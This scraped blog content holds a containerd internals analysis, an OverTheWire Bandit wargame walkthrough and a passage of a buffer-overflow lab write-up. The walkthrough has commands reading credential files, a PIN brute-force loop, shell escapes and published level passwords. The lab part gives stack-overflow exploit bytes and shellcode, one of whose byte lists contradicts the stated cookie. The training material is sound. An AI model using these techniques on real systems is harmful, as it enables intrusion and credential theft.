s.lifecycleMu.Unlock() defer cleanup() container, err := runc.NewContainer(ctx, s.platform, r) if err != nil { return nil, err } s.containers[r.ID] = container s.send(\u0026amp;eventstypes.TaskCreate{ ContainerID: r.ID, Bundle: r.Bundle, Rootfs: r.Rootfs, IO: \u0026amp;eventstypes.TaskIO{ Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Terminal: r.Terminal, }, Checkpoint: r.Checkpoint, Pid: uint32(container.Pid()), }) // The following line cannot return an error as the only state in which that // could happen would also cause the container.Pid() call above to // nil-deference panic. proc, _ := container.Process(\u0026#34;\u0026#34;) handleStarted(container, proc) return \u0026amp;taskAPI.CreateTaskResponse{ Pid: uint32(container.Pid()), }, nil } // Start a process func (s *service) Start(ctx context.Context, r *taskAPI.StartRequest) (*taskAPI.StartResponse, error) { container, err := s.getContainer(r.ID) if err != nil { return nil, err } var cinit *runc.Container s.lifecycleMu.Lock() if r.ExecID == \u0026#34;\u0026#34; { cinit = container } else { if _, initExited := s.containerInitExit[container]; initExited { s.lifecycleMu.Unlock() return nil, errdefs.ToGRPCf(errdefs.ErrFailedPrecondition, \u0026#34;container %s init process is not running\u0026#34;, container.ID) } s.runningExecs[container]++ } handleStarted, cleanup := s.preStart(cinit) s.lifecycleMu.Unlock() defer cleanup() p, err := container.Start(ctx, r) if err != nil { // If we failed to even start the process, s.runningExecs // won\u0026#39;t get decremented in s.handleProcessExit. We still need // to update it. if r.ExecID != \u0026#34;\u0026#34; { s.lifecycleMu.Lock() s.runningExecs[container]-- if ch, ok := s.execCountSubscribers[container]; ok { ch \u0026lt;- s.runningExecs[container] } s.lifecycleMu.Unlock() } handleStarted(container, p) return nil, errdefs.ToGRPC(err) } switch r.ExecID { case \u0026#34;\u0026#34;: switch cg := container.Cgroup().(type) { case cgroup1.Cgroup: if err := s.ep.Add(container.ID, cg); err != nil { log.G(ctx).WithError(err).Error(\u0026#34;add cg to OOM monitor\u0026#34;) } case *cgroupsv2.Manager: allControllers, err := cg.RootControllers() if err != nil { log.G(ctx).WithError(err).Error(\u0026#34;failed to get root controllers\u0026#34;) } else { if err := cg.ToggleControllers(allControllers, cgroupsv2.Enable); err != nil { if userns.RunningInUserNS() { log.G(ctx).WithError(err).Debugf(\u0026#34;failed to enable controllers (%v)\u0026#34;, allControllers) } else { log.G(ctx).WithError(err).Errorf(\u0026#34;failed to enable controllers (%v)\u0026#34;, allControllers) } } } if err := s.ep.Add(container.ID, cg); err != nil { log.G(ctx).WithError(err).Error(\u0026#34;add cg to OOM monitor\u0026#34;) } } s.send(\u0026amp;eventstypes.TaskStart{ ContainerID: container.ID, Pid: uint32(p.Pid()), }) default: s.send(\u0026amp;eventstypes.TaskExecStarted{ ContainerID: container.ID, ExecID: r.ExecID, Pid: uint32(p.Pid()), }) } handleStarted(container, p) return \u0026amp;taskAPI.StartResponse{ Pid: uint32(p.Pid()), }, nil } 问题与解答 1、containerd的 gRPC 目前启用加解密保护通信与否？是否有双向认证？\n答：在 containerd 中，gRPC 的加密是通过配置文件中的 TLS 设置实现的。你可以在 containerd 的配置文件 /etc/containerd/config.toml 中配置 TLS 相关的选项。\n在 config.toml 文件中，你可以为 gRPC 服务启用 TLS：\n1 2 3 4 5 6 7 8 9 [grpc] address = \u0026#34;/run/containerd/containerd.sock\u0026#34; # 开启TCP监听，默认是关闭的 tcp_address = \u0026#34;0.0.0.0:2375\u0026#34; # 配置TLS证书和密钥 tls_cert = \u0026#34;/etc/containerd/tls/containerd.crt\u0026#34; tls_key = \u0026#34;/etc/containerd/tls/containerd.key\u0026#34; # 可选的，CA证书路径 tls_ca = \u0026#34;/etc/containerd/tls/ca.crt\u0026#34; tls_cert 和 tls_key 是服务器的证书和私钥文件，containerd 将使用这些文件来加密 gRPC 通信。\ntls_ca 是可选的 CA 证书，用于验证客户端证书，从而支持双向认证（Mutual TLS, mTLS）。\n2、2.1.4中提到“插件通过 gRPC 提供服务接口，containerd 核心通过调用这些接口来管理镜像、快照和容器运行时等”。 是否意味着containerd与插件之间也是使用gRPC进行的通信？也就是containerd内部也有gRPC通信？\n答：containerd内部应该不是gRPC通信，gRPC是一个RPC通信框架，一般用于进程间，在一个进程中使用gRPC没有太大的必要，一个进程内部各模块的通信应该是通过接口和直接的函数调用来实现内部通信的。\n3、2.1.4 以及 3.1 分别提到：“守护进程与外部客户端（如 ctr 工具或 Docker 引擎）之间的通信 ”使用 gRPC/UDS ？ 特别是 3.1 如何理解？3.1 后面提到一个例子，Docker引擎通过 gRPC 连接到守护进程的UDS地址，以请求管理容器、镜像、快照等操作。问：gRPC 如何连接的这个 UDS 地址（技术原理）？\n答：这个问题理解的关键点在于uds是如何与gRPC结合使用的，containerd在服务启动的时候使用 sys.GetLocalListener 来监听一个 Unix Domain Socket。然后将监听器传递给 serve函数处理grpc请求。（具体的代码可以在4.1中找到）\n4、创建的容器的所属 user、group 默认是与containerd 同组同用户吗？\n答：我在这个问题上做了一些实验来验证。首先，创建的容器的用户和用户组肯定是可以设置的，无论是在镜像中指定，还是在创建容器的时候指定；但默认不指定的情况下镜像一般都是将容器内的进程设置为以root用户进行。这也印证了下面这句话：在 containerd 中，创建的容器默认情况下不会自动继承 containerd 进程的用户（user）和组（group）。相反，容器的用户和组是根据容器的配置（如 OCI 规范）来决定的。\n下面是我使用containerd创建alpine服务容器的权限的配置文件：\n5、3.3 提到“插件可能作为外部服务运行，需要通过 UDS 与 containerd 通信。”，例子介绍中说：“外部存储插件可能独立运行并通过 UDS 暴露其 gRPC 服务，containerd 通过连接这个 UDS 来调用插件的服务。” 问：containerd 通过 UDS 连接外部插件，外部插件暴露的 gRPC 给谁？\n答：这是containerd官方文档查到的，containerd通过gRPC连接外部插件，那外部插件暴露的gRPC肯定是给containerd的配置文件。\n6、systemd 提供使用socket activationt机制，是针对内核态进程还是用户态进程，亦或是两者都支持？\n答：针对用户态进程。\n7、containerd的socket文件的mode和uid、gid分别是？由谁设置该内容？\n答：具体回答可以看问题9，至于socket文件的mode、uid、gid的设置肯定是由containerd自己设置，具体可看源码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 //首先传入config.toml中设置的gid，uid [ttrpc] address = \u0026#34;\u0026#34; gid = 0 uid = 0 //接着调用GetLocalListener tl, err := sys.GetLocalListener(config.TTRPC.Address, config.TTRPC.UID, config.TTRPC.GID) //再创建socket文件，之后调用chmod为0660，chown为上面传入的gid、uid func GetLocalListener(path string, uid, gid int) (net.Listener, error) { // Ensure parent directory is created if err := mkdirAs(filepath.Dir(path), uid, gid); err != nil { return nil, err } l, err := CreateUnixSocket(path) if err != nil { return l, err } if err := os.Chmod(path, 0660); err != nil { l.Close() return nil, err } if err := os.Chown(path, uid, gid); err != nil { l.Close() return nil, err } return l, nil } 8、root权限下：containerd、shim以及容器的UID、GID是否都一样？如何设置容器不同的UID、GID\n答：root权限下containerd、shim的UID、GID都是root\n1 2 3 4 hacker@LAPTOP-V47UU71B:/mnt/c/Users/L$ ps -eo pid,user,group,comm | grep containerd 248 root root containerd 8561 root root containerd-shim 13295 root root containerd-shim 如何设置容器不同的uid、gid，可以在containerd创建容器时指定用户及用户组，比如我的用户和用户组都是1000，我可以这么创建容器。\n1 2 hacker@LAPTOP-V47UU71B:/mnt/c/Users/L$ sudo ctr container create -u 1000:1000 m.daocloud.io/docker.io/library/alpine:latest mycont ainer 进入容器后查看id\n1 2 3 hacker@LAPTOP-V47UU71B:/mnt/c/Users/L$ sudo ctr task exec -t --exec-id exec-1 mycontainer /bin/sh ~ $ id uid=1000 gid=1000 groups=1000 9、如果用systemd启动containerd守护进程以及用于与containerd通信的client进程，那么socket文件是由systemd创建还是containerd创建？\n如果使用 systemd 来启动 containerd 守护进程以及用于与 containerd 通信的客户端进程，并且启用了 socket activation 机制（可以不启动），那么 socket 文件将由 systemd 创建，而不是 containerd。\n（事实上containerd应该是不支持systemd的socket activation机制的，github也有人提出过在containerd中加入此机制：add socket activation · Issue #164 · containerd/containerd (github.com)）\n一般如果支持socket activation机制的话会有类似下图的逻辑，服务器会先调用sd_listen_fds函数，看systemd是否创建了socket文件，如果创建了就不会再创建了。所以如果使用system的socket activation启动进程，那么就一定是systemd创建socket文件。\n具体过程如下：\nsystemd 创建 socket：在 socket activation 机制下，systemd 会首先根据配置创建一个监听 socket 文件，并将其置于监听状态。这是在 containerd 守护进程启动之前完成的。 systemd 启动 containerd：当有客户端连接到由 systemd 创建的 socket 时，systemd 检测到连接请求并启动 containerd 守护进程，并将这个 socket 传递给 containerd。 containerd 使用 socket：containerd 启动后，接收 systemd 传递的 socket，并使用该 socket 来处理客户端的通信请求。 为了更好的理解为什么是systemd创建我们写一个使用 systemd 启动 containerd 守护进程和客户端进程的流程：\n1、创建 systemd 的 socket 单元文件\n你需要为 containerd 创建一个 .socket 单元文件，通常放在 /etc/systemd/system/containerd.socket 或 /usr/lib/systemd/system/containerd.socket。\n示例如下：\n1 2 3 4 5 6 7 8 9 [Unit] Description=containerd Socket [Socket] ListenStream=/run/containerd/containerd.sock SocketMode=0660 [Install] WantedBy=sockets.target 2、创建 systemd 的 service 单元文件\n你需要确保 containerd 的 .service 单元文件正确配置。如果默认的 service 文件不支持 socket activation，你可能需要提供一个自定义的 service 文件。放在 /etc/systemd/system/containerd.service 或 /usr/lib/systemd/system/containerd.service。\n示例如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 [Unit] Description=containerd container runtime Documentation=https://containerd.io Wants=network-online.target After=network-online.target [Service] ExecStart=/usr/bin/containerd Type=notify Restart=always LimitNOFILE=1048576 LimitNPROC=infinity LimitCORE=infinity TasksMax=infinity Delegate=yes KillMode=process OOMScoreAdjust=-999 ExecStartPre=-/sbin/modprobe overlay ExecReload=/bin/kill -s HUP $MAINPID KillSignal=SIGTERM TimeoutStartSec=0 [Install] WantedBy=multi-user.target 3、启用并启动 socket 和 service\n启用并启动 socket 和 service：\n1 2 sudo systemctl enable containerd.socket sudo systemctl start containerd.socket 此时，systemd 会监听 /run/containerd/containerd.sock，并在有客户端连接时自动启动 containerd 服务。\n10、OCI 标准是什么？\nOCI（Open Container Initiative） 是一个开源项目，旨在定义容器运行时和镜像的标准。它由 Linux Foundation 组织主导，主要包括两个关键规范：\nOCI Runtime Specification（OCI 运行时规范）： 这个规范定义了容器的运行时行为，包括如何创建、配置、启动、停止和删除容器。它定义了容器生命周期的各个阶段，以及容器进程的环境、命名空间、cgroups 等配置。 OCI Image Specification（OCI 镜像规范）： 这个规范定义了容器镜像的格式及其内容。这包括如何打包应用程序及其依赖项，以便镜像可以被各种容器运行时拉取和解压，以一致的方式运行。 11、为什么containerd最终调用的是net.listen()创建socket文件？\n因为net.listen()调用的是Go标准库net包中的一个函数，Go对底层uds的syscall做了一个封装，实际创建socket文件还是bind阶段，具体可以查看net的实现，我稍微看了一下源码确实是做了封装。\n参考资料 containerd-shim文档\n","date":"2024-10-23T00:00:00Z","image":"https://chenyuan1125.github.io/p/containerd%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/1_hu2969935857509030280.jpg","permalink":"https://chenyuan1125.github.io/p/containerd%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/","title":"containerd通信机制分析"},{"content":"参考博客：OverTheWire: Level Goal: Bandit Level 12 → Level 13\nlevel12-13 主要思路： 先将文件转化为二进制文件，再利用file命令查看文件类型，根据文件类型来解压缩\nlevel17-18 利用diff -a\nlevel18-19 The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.\n1 ssh -p 2220 bandit18@bandit.labs.overthewire.org cat readme level19-20 setuid，利用bandit20.do文件来提权root\n1 ./bandit20-do cat /etc/bandit_pass/bandit20 level20-21 利用nc -lv 监听端口，再用./suconnect 端口号连接\nlevel21-22 找到对应的crond脚本\nlevel22-23 找到对应脚本,再把bandit23的mytarget找出来，再读取密码\n1 2 3 4 5 6 7 8 9 10 bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh #!/bin/bash myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d \u0026#39; \u0026#39; -f 1) echo \u0026#34;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\u0026#34; cat /etc/bandit_pass/$myname \u0026gt; /tmp/$mytarget bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d \u0026#39; \u0026#39; -f 1 level23-24 找到对应脚本，参考上一个level的脚本，创建一个新的脚本来获取密码，注意文件的权限问题\n1 2 3 #!/bin/bash cat /etc/bandit_pass/bandit24 \u0026gt; /tmp/bandit24/bandit24 level24-25 Level Goal\nA daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. You do not need to create new connections each time\ntips： nc localhost 30002 利用shell脚本进行爆破\n注意程序可能会因为超时卡住，所以要分段爆破\n1 2 3 4 5 6 for i in {0000..9999} do echo \u0026#34;VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i\u0026#34; \u0026gt;\u0026gt; ./banditpin done cat ./banditpin | nc localhost 30002 \u0026gt;\u0026gt; ./bandit25pass level25-26 Level Goal\nLogging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.\n参考博客：OverTheWire Bandit Level 25 -\u0026gt; 26 - Walkthrough - MayADevBe Blog\nls发现目录下有bandit26的私钥，尝试使用ssh -i 进行连接，连接失败，由于/bin/bash被修改。\n利用cat /etc/passwd查看bandit26所使用的shell，发现为/usr/bin/showtext，再查看这个文件，发现它是个脚本，并且通过more打开了text.txt文件，\n1 2 3 4 5 6 7 8 9 10 11 bandit25@bandit:~$ cat /etc/passwd | grep bandit26 bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext bandit25@bandit:~$ ls -la /usr/bin/showtext -rwxr-xr-x 1 root root 53 May 7 2020 /usr/bin/showtext bandit25@bandit:~$ cat /usr/bin/showtext #!/bin/sh export TERM=linux more ~/text.txt exit 0 再次尝试ssh连接，失败\n1 2 3 4 5 6 7 8 9 $ ssh -i bandit26.sshkey bandit26@localhost ... _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | \u0026#39;_ \\ / _` | \u0026#39;_ \\ / _` | | __| / / \u0026#39;_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ Connection to bandit.labs.overthewire.org closed. 分析原因，如果text.txt文件超过一页，那么more text.txt就会等待翻页，显然，text.txt文件太小，此时需要另辟蹊径，既然文件本身改变不了，那么反过来改变运行窗口的大小也能起到同样的作用。\n进入more以后，使用v进入vim编辑模式，再通过\u0026quot;:e /etc/bandit_pass_bandit26\u0026quot;得到password。（-e 打开文件）\n或者通过:set shell=/bin/bash :shell 来进入bandit26用户\nlevel26-27 Level Goal\nGood job getting a shell! Now hurry and grab the password for bandit27!\nbandit27.do已被setid，所以执行这个文件时会短暂使用root用户权限，借此我们可以执行其它命令。\n1 2 3 4 5 6 7 bandit26@bandit:~$ ls bandit27-do text.txt bandit26@bandit:~$ ./bandit27-do Run a command as another user. Example: ./bandit27-do id bandit26@bandit:~$ ./bandit27-do cat /etc/bandit\\_pass/bandit27 3ba3118a22e93127a4ed485be72ef5ea level27-28 Level Goal\nThere is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo via the port 2220. The password for the user bandit27-git is the same as for the user bandit27.\nClone the repository and find the password for the next level.\n在/tmp创建一个目录，接着在目录下git init，再git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo，注意端口号。最后读取README文件即成功\npassword：AVanL161y9rsbcJIsFHuw35rjaOM19nR\nlevel28-29 Level Goal\nThere is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo via the port 2220. The password for the user bandit28-git is the same as for the user bandit28.\nClone the repository and find the password for the next level.\ntips：\ngit log，show us the commit log git show show us the content of a commit (when creating a public repository it is important to be aware of the information you push to it since changes and previous version are saved. So sensitive data, like passwords, could still be retrieved). 克隆远程仓库后发现readme.md文件里没有显示password，无从下手，参考别人的博客发现这两个命令，于是迎刃而解。还是得积累更多的知识。\nlevel29-30 Level Goal There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo via the port 2220. The password for the user bandit29-git is the same as for the user bandit29.\nClone the repository and find the password for the next level.\n参照上个level的流程，发现\n1 2 3 4 5 6 7 8 bandit29@bandit:/tmp/bandit29/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: \u0026lt;no passwords in production!\u0026gt; production提示我们有其它的环境\n于是利用git branch -a查看是否有其它分支，发现dev环境\n1 2 3 4 5 6 bandit29@bandit:/tmp/bandit29/repo$ git branch -a * master remotes/origin/HEAD -\u0026gt; origin/master remotes/origin/dev remotes/origin/master remotes/origin/sploits-dev 使用git checkout dev或git switch dev切换分支\n1 2 bandit29@bandit:/tmp/bandit29/repo$ git checkout remotes/origin/dev Note: switching to \u0026#39;remotes/origin/dev\u0026#39; 最后查看仓库，找到密码\n1 2 3 4 5 6 7 8 9 10 bandit29@bandit:/tmp/bandit29/repo$ ls code README.md bandit29@bandit:/tmp/bandit29/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS level30-31 Level Goal\nThere is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo via the port 2220. The password for the user bandit30-git is the same as for the user bandit30.\nClone the repository and find the password for the next level.\n与上面几个level的差异是这个level使用git tag来解决\nGit tagging is a way to mark specific points in the history of the repository. One example would be to mark release points of the software. The command to see the tags is git tag. To create a tag the command is git tag -a \u0026lt;tag_name\u0026gt; -m \u0026lt;\u0026quot;tag description/message\u0026quot;\u0026gt;. To see more details, like the tag message and commit, you can use the following command: git show \u0026lt;tag_name\u0026gt;.\n1 2 3 4 bandit30@bandit:/tmp/tmp.GLR635iQNn/repo$ git tag secret bandit30@bandit:/tmp/tmp.GLR635iQNn/repo$ git show secret OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt level31-32 Level Goal\nThere is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo via the port 2220. The password for the user bandit31-git is the same as for the user bandit31.\nClone the repository and find the password for the next level.\nTips\nGit Commit saves the currently made changes with a message describing these changes. The flag -a makes sure all modified/deleted files are staged.\nGit Push updates local changes in remote repositories. When pushing for the first time, you should also define the branch with -u.\nGit Ignore is a file with the filename ‘.gitignore’. In this file, all file names/extensions that should be ignored by the commit are written. This means if a file which is in the ignore file is created/changed, it will not be part of the commit/repository. Git ignore also allows for wildcards. (For example, : ‘*.pyc’ means all files with the ending ‘.pyc’ will be ignored.) There are pre-written files for specific situations and languages, like this one for Python.\nGit Add updates what files will be part of the next commit. The -f flag forces files to be able to be committed, even when they are normally ignored.\n.gitignore用来过滤本地仓库的一些文件或目录，使得在上传至远程仓库时忽略这些文件和目录，具体用法STFW\n解法：克隆远程仓库后查看readme.md文件，发现如下提示，按照提示创建key.txt文件，并把\u0026rsquo;May I come in?\u0026lsquo;写入，接着push到远程仓库，发现报错，于是修改.gitignore的文件内容使得其能正常push到远程仓库。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 bandit31@bandit:/tmp/bandit31/repo$ cat README.md This time your task is to push a file to the remote repository. Details: File name: key.txt Content: \u0026#39;May I come in?\u0026#39; Branch: master bandit31@bandit:/tmp/bandit31/repo$ git add . bandit31@bandit:/tmp/bandit31/repo$ git commit -a -m\u0026#34;first\u0026#34; [master 50ed76a] first 2 files changed, 2 insertions(+), 1 deletion(-) create mode 100644 key.txt Enumerating objects: 6, done. Counting objects: 100% (6/6), done. Delta compression using up to 2 threads Compressing objects: 100% (2/2), done. Writing objects: 100% (4/4), 331 bytes | 331.00 KiB/s, done. Total 4 (delta 0), reused 0 (delta 0), pack-reused 0 remote: ### Attempting to validate files... #### remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: remote: Well done! Here is the password for the next level: remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: To ssh://localhost:2220/home/bandit31-git/repo level32-33 After all this git stuff its time for another escape. Good luck!\nTips\nLinux has Variables called local variables (valid in current shell), shell variables (set up by shell) and environment variables (valid systemwide). These variables have their names in uppercase only. They are defined by writing VAR_NAME=var_value in the command line. To see the content of a variable, you can write echo $VAR_NAME.\nTo print all environment variables, you can use printenv.\nSome common that are good to know are:\nTERM - current terminal emulation HOME - the path to home directory of currently logged in user LANG - current locales settings PATH - directory list to be searched when executing commands PWD - pathname of the current working directory SHELL/0 - the path of the current user’s shell USER - currently logged-in user 解法：因为shell把我们输入的字符全部转换为大写了，所以无法执行正常的指令，大写的字符一般与环境变量有关，$0表示所使用shell的名字，$$表示进程id，通过使用$0来进入正常shell，接着进入bandit33查看密码\n1 2 3 4 5 6 7 8 $ exit \u0026gt;\u0026gt; $0 $ whoami bandit33 $ ls uppershell $ cat /etc/bandit_pass/bandit33 odHo63fHiFqcWWJG9rLiLDtPm45KzUKy ","date":"2024-10-06T00:00:00Z","image":"https://chenyuan1125.github.io/p/bandit%E5%AE%9E%E9%AA%8C/1_hu5058548300299695135.jpg","permalink":"https://chenyuan1125.github.io/p/bandit%E5%AE%9E%E9%AA%8C/","title":"bandit实验"},{"content":"buffer实验 Level 0: Candle 目标：执行 smoke()，而不是让 getbuf() 返回 1。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 void test() { int val; /* Put canary on stack to detect possible corruption */ volatile int local = uniqueval(); val = getbuf(); /* Check for corrupted stack */ if (local != uniqueval()) { printf(\u0026#34;Sabotaged!: the stack has been corrupted\\n\u0026#34;); } else if (val == cookie) { printf(\u0026#34;Boom!: getbuf returned 0x%x\\n\u0026#34;, val); validate(3); } else { printf(\u0026#34;Dud: getbuf returned 0x%x\\n\u0026#34;, val); } } 在bufboms.s的第 363 行找到了 smoke 的地址 08048c18：\n再研究 test 的部分汇编代码：\n1 2 3 4 5 6 7 8 9 10 08048daa \u0026lt;test\u0026gt;: 8048daa:\t55 push %ebp 8048dab:\t89 e5 mov %esp,%ebp 8048dad:\t53 push %ebx 8048dae:\t83 ec 24 sub $0x24,%esp 8048db1:\te8 da ff ff ff call 8048d90 \u0026lt;uniqueval\u0026gt; 8048db6:\t89 45 f4 mov %eax,-0xc(%ebp) 8048db9:\te8 36 04 00 00 call 80491f4 \u0026lt;getbuf\u0026gt; 8048dbe:\t89 c3 mov %eax,%ebx 8048dc0:\te8 cb ff ff ff call 8048d90 \u0026lt;uniqueval\u0026gt; getbuff:\n1 2 3 4 5 6 7 8 9 10 080491f4 \u0026lt;getbuf\u0026gt;: 80491f4:\t55 push %ebp 80491f5:\t89 e5 mov %esp,%ebp 80491f7:\t83 ec 38 sub $0x38,%esp 80491fa:\t8d 45 d8 lea -0x28(%ebp),%eax 80491fd:\t89 04 24 mov %eax,(%esp) 8049200:\te8 f5 fa ff ff call 8048cfa \u0026lt;Gets\u0026gt; 8049205:\tb8 01 00 00 00 mov $0x1,%eax 804920a:\tc9 leave 804920b:\tc3 ret 可以看到 lea 把 buf 的指针地址 (-0x28 (% ebp)) 传给了 Gets ()，0x28 也就是十进制的 40 个字节。而 ebp 占了 4 个字节，buf 距离 getbuff 的返回地址还有 44 个字节。\n返回地址 需要修改的地址 ebp - 占用4字节 \u0026hellip; \u0026hellip; ebp - 40 字节 buf 数组的初始地址 \u0026hellip; \u0026hellip; ebp - 0x38 esp，栈帧首地址 从文档中得知：\nGets 函数不验证是否超出了 NORMAL_BUFFER_SIZE，所以超出字符的就会覆盖掉内存。\n那么只要在 buf 开始处随便填入 44 字节（0a 除外，会终止输入），然后在后面加入 smoke 的地址，覆盖掉栈中的返回地址即可。\n另外需要注意的是 x86 机器为小端法机器，最低有效字节在内存的前面，所以在 exploit.txt 中填入如下答案即可：\n1 2 3 4 5 6 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08 level 1：Sparker 目标：调用fizz函数，并且通过传递自己的cookie值作为参数，以此来通过验证\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 08048c42 \u0026lt;fizz\u0026gt;: 8048c42:\t55 push %ebp 8048c43:\t89 e5 mov %esp,%ebp 8048c45:\t83 ec 18 sub $0x18,%esp 8048c48:\t8b 45 08 mov 0x8(%ebp),%eax 8048c4b:\t3b 05 08 d1 04 08 cmp 0x804d108,%eax 8048c51:\t75 26 jne 8048c79 \u0026lt;fizz+0x37\u0026gt; 8048c53:\t89 44 24 08 mov %eax,0x8(%esp) 8048c57:\tc7 44 24 04 ee a4 04 movl $0x804a4ee,0x4(%esp) 8048c5e:\t08 8048c5f:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048c66:\te8 55 fd ff ff call 80489c0 \u0026lt;__printf_chk@plt\u0026gt; 8048c6b:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048c72:\te8 04 07 00 00 call 804937b \u0026lt;validate\u0026gt; 8048c77:\teb 18 jmp 8048c91 \u0026lt;fizz+0x4f\u0026gt; 8048c79:\t89 44 24 08 mov %eax,0x8(%esp) 8048c7d:\tc7 44 24 04 40 a3 04 movl $0x804a340,0x4(%esp) 8048c84:\t08 8048c85:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048c8c:\te8 2f fd ff ff call 80489c0 \u0026lt;__printf_chk@plt\u0026gt; 8048c91:\tc7 04 24 00 00 00 00 movl $0x0,(%esp) 8048c98:\te8 63 fc ff ff call 8048900 \u0026lt;exit@plt\u0026gt; 栈结构示意图：\n地址 解释 ebp + 8 字节 val 返回地址 应当为 fizz 的首地址 ebp 占4字节 \u0026hellip; \u0026hellip; ebp-40字节 buf数组的初始地址 同样是在buf中插入cookie值，注意函数参数在函数返回地址之前，所以，cookie值应该插入在ebp+8起始的八个字节中，所以在 exploit.txt 中填入如下答案即可：\n1 2 3 4 5 6 7 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 42 8c 04 08 00 00 00 00 86 07 ce 2b level2：Firecracker 目标：调用bang函数，并且修改global_value为自己的cookie值\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 08048c9d \u0026lt;bang\u0026gt;: 8048c9d:\t55 push %ebp 8048c9e:\t89 e5 mov %esp,%ebp 8048ca0:\t83 ec 18 sub $0x18,%esp 8048ca3:\ta1 00 d1 04 08 mov 0x804d100,%eax 8048ca8:\t3b 05 08 d1 04 08 cmp 0x804d108,%eax 8048cae:\t75 26 jne 8048cd6 \u0026lt;bang+0x39\u0026gt; 8048cb0:\t89 44 24 08 mov %eax,0x8(%esp) 8048cb4:\tc7 44 24 04 60 a3 04 movl $0x804a360,0x4(%esp) 8048cbb:\t08 8048cbc:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048cc3:\te8 f8 fc ff ff call 80489c0 \u0026lt;__printf_chk@plt\u0026gt; 8048cc8:\tc7 04 24 02 00 00 00 movl $0x2,(%esp) 8048ccf:\te8 a7 06 00 00 call 804937b \u0026lt;validate\u0026gt; 8048cd4:\teb 18 jmp 8048cee \u0026lt;bang+0x51\u0026gt; 8048cd6:\t89 44 24 08 mov %eax,0x8(%esp) 8048cda:\tc7 44 24 04 0c a5 04 movl $0x804a50c,0x4(%esp) 8048ce1:\t08 8048ce2:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048ce9:\te8 d2 fc ff ff call 80489c0 \u0026lt;__printf_chk@plt\u0026gt; 8048cee:\tc7 04 24 00 00 00 00 movl $0x0,(%esp) 8048cf5:\te8 06 fc ff ff call 8048900 \u0026lt;exit@plt\u0026gt; 已知变量的内存地址，我们可以通过插入恶意代码来修改变量的值，汇编代码如下：\n1 2 3 4 5 # 改变 global_value movl $0x2bce0786,0x804d100 # 将 bang 函数的首地址压入栈 pushl $0x08048c9d ret 接下来就是将汇编语言转换成十六进制的机器代码了。使用gcc -m32 -c 和 objdump -d可以得到转换之后的文件：\n1 2 3 4 5 00000000 \u0026lt;.text\u0026gt;: 0:\tc7 05 00 d1 04 08 86 movl $0x2bce0786,0x804d100 7:\t07 ce 2b a:\t68 9d 8c 04 08 push $0x8048c9d f:\tc3 ret 那么所有的字节就是 c7 05 00 d1 04 08 70 5a 2d 36 68 9d 8c 04 08 c3。接下来回到 getbuff 的汇编代码：\n1 2 3 4 5 6 7 8 9 10 080491f4 \u0026lt;getbuf\u0026gt;: 80491f4:\t55 push %ebp 80491f5:\t89 e5 mov %esp,%ebp 80491f7:\t83 ec 38 sub $0x38,%esp 80491fa:\t8d 45 d8 lea -0x28(%ebp),%eax 80491fd:\t89 04 24 mov %eax,(%esp) 8049200:\te8 f5 fa ff ff call 8048cfa \u0026lt;Gets\u0026gt; 8049205:\tb8 01 00 00 00 mov $0x1,%eax 804920a:\tc9 leave 804920b:\tc3 ret 构造栈的结构：\n地址 解释 0x55683e78 入侵代码的起始地址，也就是调用get函数前eax寄存器的值 ebp 